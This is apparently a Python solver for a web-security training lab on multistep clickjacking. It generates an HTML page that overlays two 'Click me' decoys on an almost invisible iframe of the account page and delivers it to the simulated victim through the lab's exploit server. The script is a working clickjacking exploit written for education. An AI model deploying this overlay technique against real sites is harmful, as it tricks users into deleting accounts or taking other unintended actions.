import argparse
import requests

# Clickjacking labs, like the CSRF labs, are exploited by hosting an HTML page on
# the exploit server and delivering it to the victim. Python cannot BE the victim
# browser that clicks the decoys, but it can drive the exploit server's store +
# deliver API (what the "Deliver to victim" button does): upload the PoC and
# deliver it. Align both decoys in the exploit-server preview before delivering.

parser = argparse.ArgumentParser(description="Solve Clickjacking lab 5 (multistep: delete account)")
parser.add_argument("exploit_server", help="Exploit server URL (https://exploit-...exploit-server.net)")
parser.add_argument("lab_url", help="Lab URL (https://0a...web-security-academy.net)")
parser.add_argument("--first-top", default="495px", help="'top' of decoy 1 over the Delete account button")
parser.add_argument("--first-left", default="50px", help="'left' of decoy 1 over the Delete account button")
parser.add_argument("--second-top", default="295px", help="'top' of decoy 2 over the Yes confirm button")
parser.add_argument("--second-left", default="225px", help="'left' of decoy 2 over the Yes confirm button")
args = parser.parse_args()

exploit_server = args.exploit_server.rstrip("/")
lab_url = args.lab_url.rstrip("/")

# Two decoys stacked over the transparent iframe: firstClick over Delete account,
# secondClick over the Yes confirm button that appears after the first click.
# The iframe loads plain /my-account - this lab has no field to prefill.
poc = f"""<html>
  <head>
    <style>
      iframe {{ position: relative; width: 500px; height: 700px; opacity: 0.0001; z-index: 2; }}
      .firstClick, .secondClick {{ position: absolute; top: {args.first_top}; left: {args.first_left}; z-index: 1; }}
      .secondClick {{ top: {args.second_top}; left: {args.second_left}; }}
    </style>
  </head>
  <body>
    <div class="firstClick">Click me first</div>
    <div class="secondClick">Click me next</div>
    <iframe src="{lab_url}/my-account"></iframe>
  </body>
</html>"""

# the exploit server accepts a form post to store and/or deliver the response.
def exploit_action(form_action):
    return requests.post(exploit_server + "/", data={
        "urlIsHttps": "true",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
        "responseBody": poc,
        "formAction": form_action,
    })

print("[*] Storing the multistep clickjacking PoC on the exploit server...")
exploit_action("STORE")

print("[*] Delivering the exploit to the victim...")
exploit_action("DELIVER_TO_VICTIM")

# check whether the lab is now solved
status = requests.get(lab_url + "/").text
if "is-solved" in status or "Congratulations" in status:
    print("[+] Lab solved!")
else:
    print("[!] Delivered. Make sure both decoys were aligned (Delete, then Yes), then re-check in a moment.")
